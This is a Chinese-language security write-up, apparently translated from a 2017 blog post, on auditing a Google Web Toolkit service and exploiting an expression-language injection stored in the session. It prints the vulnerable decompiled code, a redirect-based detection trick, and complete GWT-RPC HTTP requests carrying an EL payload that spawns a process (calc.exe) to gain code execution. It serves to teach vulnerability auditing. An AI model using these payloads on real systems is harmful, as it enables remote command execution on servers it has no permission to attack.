
# 如何在Google Web Toolkit环境下Getshell


                                阅读量   
                                **672341**
                            
                        |
                        
                                                                                    



[![](./img/199910/t015f5a0dac56f3864f.png)](./img/199910/t015f5a0dac56f3864f.png)



Google Web Toolkit简称（GWT），是一款开源Java软件开发框架。今天这篇文章会介绍如何在这样的环境中通过注入表达式语句从而导致的高危漏洞。



## 漏洞介绍

在WEB-INF/web.xml中，我发现了以下的web端点映射：

```
&lt;servlet&gt;
&lt;servlet-name&gt;someService&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.aaa.bbb.ccc.ddd.server.SomeServiceImpl&lt;/servlet-class&gt;
&lt;/servlet&gt;

&lt;servlet-mapping&gt;
&lt;servlet-name&gt;someService&lt;/servlet-name&gt;
&lt;url-pattern&gt;/someService.gwtsvc&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
```

我们可以从上面代码中看到引用了服务器映射。由于GWT可以通过定义客户端以便于表示客户端能够进行哪些访问。我们看看这些客户端类com.aaa.bbb.ccc.ddd.client：

<code>public abstract interface SomeService<br>
extends RemoteService<br>
{<br>
public abstract void sendBeanName(String paramString);<br>
public abstract Boolean setMibNodesInfo(List&lt;MIBNodeModel&gt; paramList);<br>
public abstract void createMibNodeGettingBean();<br>
}</code>

通过以上代码我们可以看到有三个函数，所以把它们单独拿出来，看看它们的各自功能都是什么。在ServiceImpl的主函数中，我们找到了如下代码：

<code>public void sendBeanName(String paramString)<br>
{<br>
if (paramString == null) {<br>
return;<br>
}<br>
HttpSession localHttpSession = super.getThreadLocalRequest().getSession();<br>
if (localHttpSession != null) {<br>
localHttpSession.setAttribute("MibWidgetBeanName", paramString);<br>
}<br>
}</code>

在这段代码中我们通过输入字符串来更改”MibWidgetBeanName”属性。除了这一点，好像没有什么可以利用的。我们继续看setMibNodesInfo函数：

<code>public Boolean setMibNodesInfo(List&lt;MIBNodeModel&gt; paramList)<br>
{<br>
List localList = ModelUtil.mibNodeModelList2MibNodeList(paramList);<br>
if (localList != null)<br>
{<br>
MibNodesSelect localMibNodesSelect = getBeanByName();</code>

这个函数需要一个MIBNodeModel类型的一个列表。mibNodeModelList2MibNodeList这个方法会检查我们输入的列表是否符合规范，并且根据列表的一个元素的值返回不同的值。

如果列表是空，这个函数会定义一个新列表，并且将内容设置为MIBNodeModel的默认值。然后getBeanByName函数就会被调用。继续看看这一函数吧

```
private MibNodesSelect getBeanByName()
{
…

Object localObject1 = super.getThreadLocalRequest().getSession();
if (localObject1 != null)
{
  localObject2 = (String)((HttpSession)localObject1).getAttribute("MibWidgetBeanName");
  if (localObject2 != null)
  {
    localObject3 = null;
    try
    {
      localObject3 = (MibNodesSelect)FacesUtils.getValueExpressionObject(localFacesContext, "#{" + (String)localObject2 + "}");
    }
    finally
    {
      if ((localFacesContext != null) &amp;&amp; (i != 0)) {
        localFacesContext.release();
      }
    }
    return (MibNodesSelect)localObject3;
  }
}
return null;
}
```

由于这是一个私有函数，所以我们不能通过客户端直接查看到这个函数的内容。在第8行我们可以了解到这里再次使用了”MibWidgetBeanName”属性，将一个字符串存储到了localObject2中。

localObject2这个变量稍后会在第14行被用到去接受一个语言表达式。很明显，这是一个经典的表达式注入漏洞，不过前提是先反汇编出代码呀～



## 攻击过程

首先，这不是一个有返回值的语言表达式注入漏洞。这就意味着你不知道它是不是已经执行你输入的命令。因此，我将它认为是语言表达式盲注。

我通过一个简单的例子进行说明，假如我们一个JSF(java服务器框架)存在这样的一个漏洞，那么漏洞代码会类似下方：

`&lt;h:outputText value="${beanEL.ELAsString(request.getParameter('expression'))}" /&gt;`

那么，通过以下攻击代码就可以实现攻击

`http://[target]/some_endpoint/vuln.jsf?expression=9%3b1`

由于浏览器会将”+”号转换为空格，所以我们对”+”号进行url编码，如果我们得到的结果是10,那么我们就知道服务器已经执行这一个”9+1”这个命令。使用数学表达式进行注入检测是burpsuit检测注入的方法。

但是，在上述我们进行审计的代码当中，我们是不是不能去轻易的判断他是不是存在语言表达式漏洞？当然不是，我们还有其他方法。通过查找JSF说明文档，我发现了一些特别棒的函数，能够方便我们在不发出http请求确定是否存在EL注入。

Oracle官方文档陈述道你可以在FacesContext对象中使用getExternalContext方法。这个方法会返回一个ExternalContext类型的值，它允许我们设置特定对象的响应属性。当我查看文档时，这两个函数引起了我的注意：
1. setResponseCharacterEncoding
1. redirect
因此我们可以通过设置这个特定字符串为下面java代码：

`facesContext.getExternalContext().redirect("http://srcincite.io/");`

如果响应状态值为302,重定向到了”[http://srcincite.io/](http://srcincite.io/) “,那么我们就可以确定存在漏洞。



## 漏洞测试

我们第一个请求是对MibWidgetBeanName属性进行赋值

```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: /
X-GWT-Module-Base:
X-GWT-Permutation:
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 195

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|facesContext.getExternalContext().redirect(“http://srcincite.io/")|1|2|3|4|1|5|6|
```



通过返回响应为”//ok[[],0,6]”可以了解到，我们对GWT注意已经成功。然后第二个请求触发存放在session中的字符串。但是，当我们发送请求之前，因为setMibNodesInfo函数传入的是一个复杂的变量类型，我们需要查看被保护文件的源代码，了解一下允许提交的类型。在[strongname].gwt.rpc文件中，我找到了在数组中可以提交的类型: java.util.ArrayList/382197682。

现在我们可以发送我们的请求数据了



```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: /
X-GWT-Module-Base:
X-GWT-Permutation:
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 171

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0|
```

正确的返回包内容应该和下面相似：

```
HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=[cookie]; Path=/; Secure; HttpOnly
Set-Cookie: oam.Flash.RENDERMAP.TOKEN=-g9lc30a8l; Path=/; Secure
Pragma: no-cache
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Pragma: no-cache
Location: http://srcincite.io/
Content-Type: text/html;charset=UTF-8
Content-Length: 45
Date: Wed, 03 May 2017 18:58:36 GMT
Connection: close

//OK[0,1,[“java.lang.Boolean/476441737”],0,6]
```

当然，能够重定向说明已经执行成功了。但是我们需要的是得到shell，在这篇文章

[http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html](http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html)

可以使用ScriptEngineManager的脚本执行java代码。不过他们的代码都特别长，所以我使用相同的方法自己写了一个

`"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var proc=new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/c\",\"calc.exe\"]).start();")`

更新MibWidgetBeanName属性值，然后使用setMibNodesInfo再一次除非这个字符串，然后得到系统权限.



```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: /
X-GWT-Module-Base:
X-GWT-Permutation:
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 366

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|””.getClass().forName(“javax.script.ScriptEngineManager”).newInstance().getEngineByName(“JavaScript”).eval(“var proc=new java.lang.ProcessBuilder“(java.lang.String[])“.start();”)|1|2|3|4|1|5|6|
```

触发语言表达式：

```
POST /someService.gwtsvc HTTP/1.1
Host: [target]
Accept: /
X-GWT-Module-Base:
X-GWT-Permutation:
Cookie: JSESSIONID=[cookie]
Content-Type: text/x-gwt-rpc; charset=UTF-8
Content-Length: 171

6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0|
```

[![](./img/199910/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018d36e34615bebb1e.jpg)



## 结论

这一漏洞几乎不可能在黑盒渗透测试中被发现。像burp suite这样的工具不会发现这样的漏洞，尤其是在考虑到字符串储存到seesion中这种情况。

随着网络技术的进步，我们对自动化的依赖越来越大， 在这一领域我们需要更多知识，技能以及工具。<br>
资料参考<br>[http://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html](http://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html)

[![](./img/199910/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a6af78fb6b1a8088.png)

专注于普及网络安全知识。团队已出版《Web安全攻防：渗透测试实战指南》，《内网安全攻防：渗透测试实战指南》，目前在编Python渗透测试，JAVA代码审计和二进制逆向方面的书籍。

团队公众号定期分享关于CTF靶场、内网渗透、APT方面技术干货，从零开始、以实战落地为主，致力于做一个实用的干货分享型公众号。

官方网站：www.ms08067.com
